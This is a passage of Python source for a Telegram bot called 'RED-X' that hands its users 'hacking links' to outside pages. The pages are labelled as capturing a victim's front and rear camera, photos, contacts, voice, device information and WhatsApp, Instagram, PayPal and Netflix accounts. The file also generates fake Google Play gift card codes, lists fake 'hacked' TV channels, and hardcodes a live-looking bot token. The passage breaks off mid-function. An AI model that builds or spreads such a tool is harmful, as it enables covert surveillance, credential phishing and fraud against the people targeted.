import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import sqlite3
import time
import logging
import json
import re
import requests
import urllib.parse
import traceback
import os
import base64
import secrets
import string
import random
from datetime import datetime, timedelta

BOT_TOKEN = "8625802970:AAHO5SyEW4acduEF5JWjfckA3AEfSDmoVIU"
MAIN_ADMIN_ID = 6408034985
OWNER_NAME = "RED BHAI"
OWNER_USERNAME = "@trolex00"
OWNER_LINK = "https://t.me/trolex00"

DB_FILE = "database.sqlite"

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.FileHandler("bot.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(BOT_TOKEN)

# ==================== healing functionsر ====================
def encode_token(token):
    return base64.b64encode(token.encode()).decode()

def decode_token(encoded):
    try:
        return base64.b64decode(encoded).decode()
    except:
        return encoded

# ==================== Google Play card generator functions ====================
def generate_google_play_code():
    """Generate a random Google Play gift card code"""
    groups = []
    for _ in range(4):
        group = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(4))
        groups.append(group)
    return '-'.join(groups)

def generate_random_date(start_year=2024, end_year=2027):
    """Generate a random date"""
    start_date = datetime(start_year, 1, 1)
    end_date = datetime(end_year, 12, 31)
    delta = end_date - start_date
    random_days = random.randint(0, delta.days)
    return start_date + timedelta(days=random_days)

def generate_google_play_card():
    """Generate a random Google Play gift card"""
    # Random code
    code = generate_google_play_code()
    
    # Random value between $20 and $80
    value = random.randint(20, 80)
    
    # Release date (from 2024 to 2025)
    issue_date = generate_random_date(2024, 2025)
    
    # Expiration date (one to two years after release)
    expiry_date = issue_date + timedelta(days=random.randint(365, 730))
    
    # Random serial number (12 digits)
    serial = ''.join(str(random.randint(0, 9)) for _ in range(12))
    
    return {
        'code': code,
        'value': value,
        'issue_date': issue_date.strftime('%Y-%m-%d'),
        'expiry_date': expiry_date.strftime('%Y-%m-%d'),
        'serial': serial
    }

# ==================== Password generation module ====================
def generate_strong_password():
    # Capital letters H
    uppercase = string.ascii_uppercase
    # lowercase letters h
    lowercase = string.ascii_lowercase
    # numbers 1
    digits = string.digits
    # symbols #
    symbols = "#$"
    
    # Merge all letters
    all_chars = uppercase + lowercase + digits + symbols
    
    # Make sure there is at least one letter of each type.
    password = [
        secrets.choice(uppercase),
        secrets.choice(lowercase),
        secrets.choice(digits),
        secrets.choice(symbols)
    ]
    
    # Complete the rest randomly
    for _ in range(12):  # 16 - 4 = 12
        password.append(secrets.choice(all_chars))
    
    # Word confusion
    secrets.SystemRandom().shuffle(password)
    
    return ''.join(password)

# ==================== Database setup ====================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        first_name TEXT,
        username TEXT,
        join_date TEXT,
        points INTEGER DEFAULT 0
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS admins (
        user_id INTEGER PRIMARY KEY
    )''')
    c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (MAIN_ADMIN_ID,))
    
    c.execute('''CREATE TABLE IF NOT EXISTS banned_users (
        user_id INTEGER PRIMARY KEY
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS user_points (
        user_id INTEGER PRIMARY KEY,
        points INTEGER DEFAULT 0
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS user_states (
        chat_id INTEGER PRIMARY KEY,
        state TEXT,
        data TEXT
    )''')
    
    conn.commit()
    conn.close()
    logger.info("✅ The database has been configured")

def get_pdo():
    return sqlite3.connect(DB_FILE)

def get_user_points(user_id):
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("SELECT points FROM user_points WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        conn.close()
        return result[0] if result else 0
    except Exception as e:
        logger.error(f"Error in retrieving points: {e}")
        return 0

def add_points(user_id, points):
    try:
        conn = get_pdo()
        c = conn.cursor()
        current = get_user_points(user_id)
        c.execute("INSERT OR REPLACE INTO user_points (user_id, points) VALUES (?, ?)", (user_id, current + points))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error in adding points: {e}")

def is_admin(user_id):
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("SELECT 1 FROM admins WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        conn.close()
        return result is not None
    except Exception as e:
        logger.error(f"Supervisor verification error: {e}")
        return False

def add_admin(user_id):
    if user_id == MAIN_ADMIN_ID:
        return
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error adding administrator: {e}")

def remove_admin(user_id):
    if user_id == MAIN_ADMIN_ID:
        return
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("DELETE FROM admins WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error deleting administrator: {e}")

def is_banned(user_id):
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("SELECT 1 FROM banned_users WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        conn.close()
        return result is not None
    except Exception as e:
        logger.error(f"Block verification error: {e}")
        return False

def ban_user(user_id):
    if user_id == MAIN_ADMIN_ID:
        return
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO banned_users (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"User blocking error: {e}")

def unban_user(user_id):
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("DELETE FROM banned_users WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error unblocking user: {e}")

def register_user(user_id, first_name, username=None):
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO users (user_id, first_name, username, join_date) VALUES (?, ?, ?, ?)",
                  (user_id, first_name, username, time.strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"User registration error: {e}")

def get_user_state(chat_id):
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("SELECT state, data FROM user_states WHERE chat_id = ?", (chat_id,))
        result = c.fetchone()
        conn.close()
        if result:
            try:
                data = json.loads(result[1]) if result[1] else {}
                return {'state': result[0], 'data': data}
            except json.JSONDecodeError:
                return {'state': result[0], 'data': {}}
        return None
    except Exception as e:
        logger.error(f"Error fetching user state: {e}")
        return None

def set_user_state(chat_id, state, data=None):
    try:
        conn = get_pdo()
        c = conn.cursor()
        json_data = json.dumps(data) if data else '{}'
        c.execute("INSERT OR REPLACE INTO user_states (chat_id, state, data) VALUES (?, ?, ?)",
                  (chat_id, state, json_data))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error setting user status: {e}")

def delete_user_state(chat_id):
    try:
        conn = get_pdo()
        c = conn.cursor()
        c.execute("DELETE FROM user_states WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error deleting user status: {e}")

# ==================== hacking links ====================
def get_hack_link(link_type, user_id):
    encoded_token = encode_token(BOT_TOKEN)
    
    links = {
        'hk_tiktok': f"https://dev-alol-bot.pantheonsite.io/1/index1.php?id={user_id}&tok={encoded_token}",
        'hack_faok': f"https://dev-alol-bot.pantheonsite.io/1/index.php?id={user_id}&tok={encoded_token}",
        'hpck_tiktok': f"https://dev-alol-bot.pantheonsite.io/1/index3.php?id={user_id}&tok={encoded_token}",
        'hook_tiktok': f"https://dev-alol-bot.pantheonsite.io/1/index2.php?id={user_id}&tok={encoded_token}",
        'hack_whatsapp': f"https://dev-alol-bot.pantheonsite.io/1/index6.php?id={user_id}&tok={encoded_token}",
        'hack_instagram': f"https://dev-alol-bot.pantheonsite.io/1/index5.php?id={user_id}&tok={encoded_token}",
        'hack_wifi': f"https://dev-alol-bot.pantheonsite.io/1/index7.php?id={user_id}&tok={encoded_token}",
        'hack_freefire': f"https://dev-alol-bot.pantheonsite.io/1/index12.php?id={user_id}&tok={encoded_token}",
        'hack_freefire_lite': f"https://dev-alol-bot.pantheonsite.io/1/index16.php?id={user_id}&tok={encoded_token}",
        'hack_snapchat': f"https://dev-alol-bot.pantheonsite.io/1/index14.php?id={user_id}&tok={encoded_token}",
        'hack_youtube': f"https://dev-alol-bot.pantheonsite.io/1/index17.php?id={user_id}&tok={encoded_token}",
        'hack_facebook': f"https://dev-alol-bot.pantheonsite.io/1/index10.php?id={user_id}&tok={encoded_token}",
        'hack_tiktok_main': f"https://dev-alol-bot.pantheonsite.io/1/index13.php?id={user_id}&tok={encoded_token}",
        'hack_paypal': f"https://dev-alol-bot.pantheonsite.io/1/index8.php?id={user_id}&tok={encoded_token}",
        'hack_quai': f"https://dev-alol-bot.pantheonsite.io/1/index15.php?id={user_id}&tok={encoded_token}",
        'hack_twitter': f"https://dev-alol-bot.pantheonsite.io/1/index11.php?id={user_id}&tok={encoded_token}",
        'hack_netflix': f"https://dev-alol-bot.pantheonsite.io/1/index9.php?id={user_id}&tok={encoded_token}",
        'hack_ip': f"https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/ip.php?id={user_id}&tok={encoded_token}",
        'hack_device_info': f"https://dev-alol-bot.pantheonsite.io/1/index4.php?id={user_id}&tok={encoded_token}",
        'steal_photos': f"https://dev-alol-bot.pantheonsite.io/1/index18.php?id={user_id}&tok={encoded_token}",
        'hack_google': f"https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/index5.html?id={user_id}&tok={encoded_token}",
        'hack_telegram': f"https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/index6.html?id={user_id}&tok={encoded_token}",
        'hack_discord': f"https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/index7.html?id={user_id}&tok={encoded_token}",
        'steal_contacts': f"https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/contacts.html?id={user_id}&tok={encoded_token}",
    }
    
    return links.get(link_type, None)

# ==================== Television channel functions ====================
def get_tv_channels_by_country(country_code):
    channels = []
    if country_code == 'egypt':
        channels = ["📺 A new channel has been hacked:\nhttps://www.masrplay.xyz/"]
        for i in range(1, 51):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'saudi':
        channels = ["📺 A new channel has been hacked:\nhttps://www.mbc.net/"]
        for i in range(1, 41):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'uae':
        channels = ["📺 A new channel has been hacked:\nhttps://www.dmi.ae/"]
        for i in range(1, 43):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'kuwait':
        channels = ["📺 A new channel has been hacked:\nhttps://www.kuna.net.kw/"]
        for i in range(1, 46):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'qatar':
        channels = ["📺 A new channel has been hacked:\nhttps://www.aljazeera.net/"]
        for i in range(1, 47):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'bahrain':
        channels = ["📺 A new channel has been hacked:\nhttps://www.bna.bh/"]
        for i in range(1, 49):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'oman':
        channels = ["📺 A new channel has been hacked:\nhttps://www.oman-tv.gov.om/"]
        for i in range(1, 50):
            channels.append(f"📺 تم اختراق قناة جديدة:\nhttps://www.mbc{i}.com/")
    elif country_code == 'jordan':
        channels = ["📺 A new channel has been hacked:\nhttps://www.jrtv.jo/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'lebanon':
        channels = ["📺 A new channel has been hacked:\nhttps://www.teleliban.com/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'palestine':
        channels = ["📺 A new channel has been hacked:\nhttps://www.pbc.ps/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'iraq':
        channels = ["📺 A new channel has been hacked:\nhttps://www.imn.iq/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'syria':
        channels = ["📺 A new channel has been hacked:\nhttps://www.ortas.online/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'yemen':
        channels = ["📺 A new channel has been hacked:\nhttps://www.yementv.net/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'libya':
        channels = ["📺 A new channel has been hacked:\nhttps://www.ljtv.ly/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'tunisia':
        channels = ["📺 A new channel has been hacked:\nhttps://www.tunisiatv.tn/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'algeria':
        channels = ["📺 A new channel has been hacked:\nhttps://www.entv.dz/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'morocco':
        channels = ["📺 A new channel has been hacked:\nhttps://www.snrt.ma/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'sudan':
        channels = ["📺 A new channel has been hacked:\nhttps://www.sudantv.net/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'somalia':
        channels = ["📺 A new channel has been hacked:\nhttps://www.sntv.so/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    elif country_code == 'mauritania':
        channels = ["📺 A new channel has been hacked:\nhttps://www.rmi.mr/"]
        for i in range(1, 50):
            channels.append(f"📺 A new channel has been hacked:\nhttps://www.mbc{i}.com/")
    else:
        channels = ["📺 There are currently no channels available for this country.."]
    return channels

# ==================== Support Services Functions ====================
def get_ip_info(ip):
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        return False
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query", timeout=10)
        data = response.json()
        if data.get('status') == 'success':
            return data
    except:
        pass
    return False

def get_video_download_link(url):
    if not url:
        return False
    if 'tiktok.com' in url or 'vt.tiktok.com' in url:
        try:
            response = requests.get(f"https://tikwm.com/api/?url={urllib.parse.quote(url)}", timeout=10)
            data = response.json()
            if data.get('data', {}).get('play'):
                return {'type': 'video', 'url': data['data']['play']}
        except:
            pass
    if 'instagram.com' in url:
        try:
            response = requests.get(f"https://api.agatz.xyz/api/igdl?url={urllib.parse.quote(url)}", timeout=10)
            data = response.json()
            if data.get('data') and data['data'][0].get('url'):
                return {'type': 'video', 'url': data['data'][0]['url']}
        except:
            pass
    if 'youtube.com' in url or 'youtu.be' in url:
        try:
            response = requests.get(f"https://api.agatz.xyz/api/ytmp4?url={urllib.parse.quote(url)}", timeout=10)
            data = response.json()
            if data.get('data', {}).get('download'):
                return {'type': 'video', 'url': data['data']['download']}
        except:
            pass
    return False

def shorten_url(long_url):
    try:
        response = requests.get(f"https://is.gd/create.php?format=simple&url={urllib.parse.quote(long_url)}", timeout=10)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return False

def text_to_speech(text):
    try:
        url = f"https://translate.google.com/translate_tts?ie=UTF-8&q={urllib.parse.quote(text)}&tl=ar&client=tw-ob"
        return url
    except:
        return False

def get_webhook_info(bot_token):
    try:
        response = requests.get(f"https://api.telegram.org/bot{bot_token}/getWebhookInfo", timeout=10)
        data = response.json()
        if data.get('ok'):
            return data.get('result')
    except:
        pass
    return None

def set_webhook(bot_token, url):
    try:
        response = requests.get(f"https://api.telegram.org/bot{bot_token}/setWebhook?url={urllib.parse.quote(url)}", timeout=10)
        return response.json()
    except:
        return None

def delete_webhook(bot_token):
    try:
        response = requests.get(f"https://api.telegram.org/bot{bot_token}/deleteWebhook", timeout=10)
        return response.json()
    except:
        return None

# ==================== القوائم ====================
def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("Rear camera hacking 📷", callback_data='hk_tiktok'),
        InlineKeyboardButton("Front camera hacking 📸", callback_data='hack_faok')
    )
    keyboard.add(
        InlineKeyboardButton("Video of the victim 🎥", callback_data='hpck_tiktok'),
        InlineKeyboardButton("Duha's voice recording 🎙", callback_data='hook_tiktok')
    )
    keyboard.add(
        InlineKeyboardButton("WhatsApp hacking 🟢", callback_data='hack_whatsapp'),
        InlineKeyboardButton("Instagram hack 📌", callback_data='hack_instagram')
    )
    keyboard.add(
        InlineKeyboardButton("Hacking Wi-Fi 🛜", callback_data='hack_wifi'),
        InlineKeyboardButton("Hacking PUBG 🎯", callback_data='hack_freefire')
    )
    keyboard.add(
        InlineKeyboardButton("Free Fire hack 💥", callback_data='hack_freefire_lite'),
        InlineKeyboardButton("Snapchat hack 👻", callback_data='hack_snapchat')
    )
    keyboard.add(
        InlineKeyboardButton("Hacking TV channels 📺", callback_data='tv_channels_menu')
    )
    keyboard.add(
        InlineKeyboardButton("Hacking YouTube 🎓", callback_data='hack_youtube')
    )
    keyboard.add(
        InlineKeyboardButton("Facebook hacking 🌐", callback_data='hack_facebook'),
        InlineKeyboardButton("Hacking TikTok 💣", callback_data='hack_tiktok_main')
    )
    keyboard.add(
        InlineKeyboardButton("Pal Pay hack 🔝", callback_data='hack_paypal'),
        InlineKeyboardButton("Kwai's Break 🔮", callback_data='hack_quai')
    )
    keyboard.add(
        InlineKeyboardButton("Twitter hack 🕊", callback_data='hack_twitter'),
        InlineKeyboardButton("Breaking | Netflix 🔉", callback_data='hack_netflix')
    )
    keyboard.add(
        InlineKeyboardButton("Attack on device IP ⚡️", callback_data='hack_ip'),
        InlineKeyboardButton("Device information collection 🖥", callback_data='hack_device_info')
    )
    keyboard.add(
        InlineKeyboardButton("Phone formatting apps 👀", callback_data='format_phone')
    )
    keyboard.add(
        InlineKeyboardButton("Pull contacts 📞", callback_data='steal_contacts')
    )
    keyboard.add(
        InlineKeyboardButton("game ❎  🅾", web_app=WebAppInfo(url='https://max.powerv1.site/pag/x.html')),
        InlineKeyboardButton(" intelligence game 🤦‍♂", web_app=WebAppInfo(url='https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/index30.html'))
    )
    keyboard.add(
        InlineKeyboardButton("Telegram Themes 𓆩💖𓆪", callback_data='telegram_themes')
    )
    keyboard.add(
        InlineKeyboardButton("Open WhatsApp chat 𓆩💚𓆪", callback_data='open_whatsapp')
    )
    keyboard.add(
        InlineKeyboardButton("★ Channel -  ★", url='https://t.me/REDX_64')
    )
    keyboard.add(
        InlineKeyboardButton("CHAT GPT 🧠", web_app=WebAppInfo(url='https://chatgpt.com/')),
        InlineKeyboardButton("Internet speed test 🚀", web_app=WebAppInfo(url='https://fast.com/ar/'))
    )
    keyboard.add(
        InlineKeyboardButton("Very accurate information 🔴", web_app=WebAppInfo(url='https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/index31.html'))
    )
    keyboard.add(
        InlineKeyboardButton("Unblock WhatsApp 👨‍💻", callback_data='unban_whatsapp'),
        InlineKeyboardButton("ban Instagram ‼️", callback_data='ban_instagram')
    )
    keyboard.add(
        InlineKeyboardButton("Banning TikTok live streams 💥", callback_data='ban_tiktok_live')
    )
    keyboard.add(
        InlineKeyboardButton("Relationship breakdown 👿", callback_data='booby_trap_link'),
        InlineKeyboardButton("Name decoration ✨", callback_data='name_zakhrafa')
    )
    keyboard.add(
        InlineKeyboardButton("Hide link 🪄", callback_data='hide_link'),
        InlineKeyboardButton("Check the links 🔓", callback_data='check_link')
    )
    keyboard.add(
        InlineKeyboardButton("Complete phone hacking 💢", callback_data='hack_hone'),
        InlineKeyboardButton("Retrieve photos of the victim 🔞", callback_data='steal_photos')
    )
    keyboard.add(
        InlineKeyboardButton("Barcode reading 🪙", web_app=WebAppInfo(url='https://products.aspose.app/barcode/ar/recognize/'))
    )
    keyboard.add(
        InlineKeyboardButton("Follow the IP 🌍", callback_data='ip_info')
    )
    keyboard.add(
        InlineKeyboardButton("fake numbers ☎️", callback_data='virtual_numbers'),
        InlineKeyboardButton("Temporary mail 📨", callback_data='temp_mail')
    )
    keyboard.add(
        InlineKeyboardButton("Your ID 🆔", callback_data='my_id')
    )
    # The following buttons have been removed:
    # InlineKeyboardButton("Text to Speech 🔉", callback_data='text_to_speech'),
    # InlineKeyboardButton("Generate Password 💎", callback_data='generate_password')
    # InlineKeyboardButton("Google Play Cards 🧾", callback_data='google_play_card')
    keyboard.add(
        InlineKeyboardButton("Very accurate information 2⃣ 🔴", web_app=WebAppInfo(url='https://dev-amer-ahmed-mohamedv.pantheonsite.io/A/index.html'))
    )
    keyboard.add(
        InlineKeyboardButton("fake call 📊", web_app=WebAppInfo(url='https://callmyphone.org/app')),
        InlineKeyboardButton("User knowledge 👤", callback_data='user_info')
    )
    keyboard.add(
        InlineKeyboardButton("Scaring the victim 😂", callback_data='scare_link')
    )
    keyboard.add(
        InlineKeyboardButton("Shorten link 🔗", callback_data='shorten_url'),
        InlineKeyboardButton("The | Dark Web ⚠️", callback_data='dark_web')
    )
    keyboard.add(
        InlineKeyboardButton("I want to lock my phone. 📵", callback_data='lock_phone')
    )
    keyboard.add(
        InlineKeyboardButton("Website closures ⚰️", web_app=WebAppInfo(url='https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/index32.html'))
    )
    keyboard.add(
        InlineKeyboardButton("Bot evaluation 🌟", callback_data='rate_bot'),
        InlineKeyboardButton("Message to the owner 📲", callback_data='message_owner')
    )
    keyboard.add(
        InlineKeyboardButton("💖🫣 The person I love the most 🫣💖", url='tg://settings')
    )
    keyboard.add(
        InlineKeyboardButton("Summary 😳 🔥", web_app=WebAppInfo(url='https://dev-amer-ahmed-mohamedv.pantheonsite.io/Website/index33.html'))
    )
    keyboard.add(
        InlineKeyboardButton("✧ The owner - RED-X ✧", url=OWNER_LINK)
    )
    return keyboard
def get_tv_channels_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    countries = [
        ('🇪🇬 Egypt', 'tv_egypt'),
        ('🇸🇦 Saudi Arabia', 'tv_saudi'),
        ('🇦🇪 The UAE', 'tv_uae'),
        ('🇰🇼 Kuwait', 'tv_kuwait'),
        ('🇶🇦 Qatar', 'tv_qatar'),
        ('🇧🇭 Bahrain', 'tv_bahrain'),
        ('🇴🇲 Oman', 'tv_oman'),
        ('🇯🇴 Jordan', 'tv_jordan'),
        ('🇱🇧 Lebanon', 'tv_lebanon'),
        ('🇵🇸 Palestine', 'tv_palestine'),
        ('🇮🇶 Iraq', 'tv_iraq'),
        ('🇸🇾 Syria', 'tv_syria'),
        ('🇾🇪 Yemen', 'tv_yemen'),
        ('🇱🇾 Libya', 'tv_libya'),
        ('🇹🇳 Tunisia', 'tv_tunisia'),
        ('🇩🇿 Algeria', 'tv_algeria'),
        ('🇲🇦 Morocco', 'tv_morocco'),
        ('🇸🇩 Sudan', 'tv_sudan'),
        ('🇸🇴 Somalia', 'tv_somalia'),
        ('🇲🇷 Mauritania', 'tv_mauritania'),
    ]
    for name, data in countries:
        keyboard.add(InlineKeyboardButton(name, callback_data=data))
    keyboard.add(InlineKeyboardButton("🔙 Reference", callback_data='back_to_main'))
    return keyboard

def get_admin_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("➕ Add admin", callback_data='add_admin'),
        InlineKeyboardButton("➖ Remove Musharraf", callback_data='remove_admin')
    )
    keyboard.add(
        InlineKeyboardButton("🚫 Bite ban", callback_data='ban_user'),
        InlineKeyboardButton("✅ Unblock biting", callback_data='unban_user')
    )
    keyboard.add(
        InlineKeyboardButton("📊 Number of subscribers", callback_data='subscribers_count')
    )
    keyboard.add(
        InlineKeyboardButton("📢 Message Radio", callback_data='broadcast_message')
    )
    keyboard.add(
        InlineKeyboardButton("🔙 Return to main menu", callback_data='back_to_main')
    )
    return keyboard

def get_webhook_services_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("📡 Display bot information", callback_data='webhook_info'),
        InlineKeyboardButton("🔧 WebHook Modification", callback_data='webhook_set'),
        InlineKeyboardButton("🗑️ Web hook removal", callback_data='webhook_delete'),
        InlineKeyboardButton("🔙 Reference", callback_data='back_to_main')
    )
    return keyboard

# ==================== Bot commands ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name
        username = message.from_user.username

        logger.info(f"Start command for user {user_id}")

        if ' ' in message.text:
            parts = message.text.split(' ')
            if len(parts) > 1:
                try:
                    referrer_id = int(parts[1])
                    if referrer_id != user_id:
                        add_points(referrer_id, 1)
                        bot.send_message(user_id, f"✅ Thank you for using the invite link! A point has been added to the user. {referrer_id}")
                except:
                    pass

        if is_banned(user_id):
            bot.reply_to(message, "🚫 You are banned from using the bot.")
            return

        register_user(user_id, first_name, username)

        welcome_text = f"""Welcome, my dear 👋

In the private bot, RED-X

Please use the bot for good only 🫶

🎉 All buttons are free!! 🫶

🎛️ Choose from the list:"""
        
        bot.reply_to(message, welcome_text, parse_mode='Markdown', reply_markup=get_main_keyboard())
        logger.info(f"The main menu was sent to the user {user_id}")
    except Exception as e:
        logger.error(f"Error in the start command: {e}\n{traceback.format_exc()}")
        bot.reply_to(message, f"❌ An unexpected error occurred. Please try again later.\n\n{str(e)}")

@bot.message_handler(commands=['id'])
def id_command(message):
    try:
        user_id = message.from_user.id
        bot.reply_to(message, f"🆔 **Idik is:** `{user_id}`", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error in command id: {e}")

@bot.message_handler(commands=['points'])
def points_command(message):
    try:
        points = get_user_points(message.from_user.id)
        bot.reply_to(message, f"💰 **Your current balance:** {points} a point", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error in command points: {e}")

@bot.message_handler(commands=['invite'])
def invite_command(message):
    try:
        bot_username = bot.get_me().username
        invite_link = f"https://t.me/{bot_username}?start={message.from_user.id}"
        bot.reply_to(message, f"🔗 **Your invitation link:**\n\n{invite_link}", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error in command invite: {e}")

@bot.message_handler(commands=['help'])
def help_command(message):
    try:
        help_text = """
🆘 **Help menu:**

/start - View main menu
/id - Idex Special Offer
/points - Points balance display
/invite - Your invitation link
/admin - Administrator Control Panel (For Administrators Only)
"""
        bot.reply_to(message, help_text, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error in the help command: {e}")

@bot.message_handler(commands=['admin'])
def admin_command(message):
    try:
        user_id = message.from_user.id
        if not is_admin(user_id):
            bot.reply_to(message, "❌ This is for supervisors only.")
            return
        text = f"""
⚙️ **Bot control panel**

👤 The hands: `{user_id}`
👑 Owner: `{MAIN_ADMIN_ID}`

**Available features:**
"""
        bot.reply_to(message, text, parse_mode='Markdown', reply_markup=get_admin_keyboard())
    except Exception as e:
        logger.error(f"Error in the admin command: {e}")

# ==================== معالجة الكولباك ====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        user_id = call.from_user.id
        message_id = call.message.message_id
        chat_id = call.message.chat.id
        data = call.data

        if is_banned(user_id):
            bot.answer_callback_query(call.id, "🚫 You are banned from using the bot.", show_alert=True)
            return

        # Generating Google Play gift cards
        if data == 'google_play_card':
            bot.answer_callback_query(call.id, "Random card hacking is underway 🤵", show_alert=False)
            time.sleep(10)
            card = generate_google_play_card()
            text = f"""✅ Your Google Play card has been successfully generated!

🔑 Code: `{card['code']}`
💰 Value: ${card['value']}
📅 version: {card['issue_date']}
⏳ Finish: {card['expiry_date']}
🔢 sequential: {card['serial']}

Enjoy the card, love!"""
            bot.send_message(chat_id, text, parse_mode='Markdown')
            return

        # Generate password
        if data == 'generate_password':
            try:
                password = generate_strong_password()
                text = f"""A strong password was created 🔥
password : `{password}`
All rights reserved by: {OWNER_USERNAME} 👑"""
                bot.send_message(chat_id, text, parse_mode='Markdown')
                bot.answer_callback_query(call.id)
            except Exception as e:
                logger.error(f"Password generation error: {e}")
                bot.answer_callback_query(call.id, "❌ An error occurred while generating the password.", show_alert=True)
            return

        # hacking links
        hack_link = get_hack_link(data, user_id)
        if hack_link:
            bot.send_message(chat_id, f"👿 **Hacking link:**\n\n<code>{hack_link}</code>\n\n🔐 **Bot information:**\nThe hands: <code>{user_id}</code>", parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return

        # Text-to-speech service
        if data == 'text_to_speech':
            msg = bot.send_message(chat_id, "🔊 Send the text to be converted to speech (maximum 200 characters):")
            bot.register_next_step_handler(msg, process_text_to_speech)
            bot.answer_callback_query(call.id)
            return

        # User Information Service (Administrators Only))
        if data == 'user_info':
            if not is_admin(user_id):
                bot.answer_callback_query(call.id, "❌ This service is for administrators only.", show_alert=True)
                return
            bot.send_message(chat_id, f"""👤 **Your account information:**

🆔 The hands: `{user_id}`
👤 first name: {call.from_user.first_name}
👥 user name: @{call.from_user.username if call.from_user.username else 'nothing'}
